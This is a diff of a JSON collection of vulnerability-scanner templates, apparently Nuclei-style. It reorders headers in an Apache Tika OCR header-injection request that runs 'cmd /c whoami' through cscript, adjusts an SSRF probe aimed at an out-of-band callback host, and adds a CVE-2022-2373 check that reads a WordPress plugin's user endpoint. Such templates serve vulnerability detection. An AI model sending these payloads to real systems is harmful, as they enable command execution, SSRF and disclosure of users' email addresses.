@@ -6771,11 +6771,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -10349,8 +10349,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -20528,6 +20528,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/Runtime/Data/ms_admin.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-2373",
+      "info": {
+        "name": "Simply Schedule Appointments < 1.5.7.7 - Email Address Disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-json/ssa/v1/users"
           ]
         }
       ]
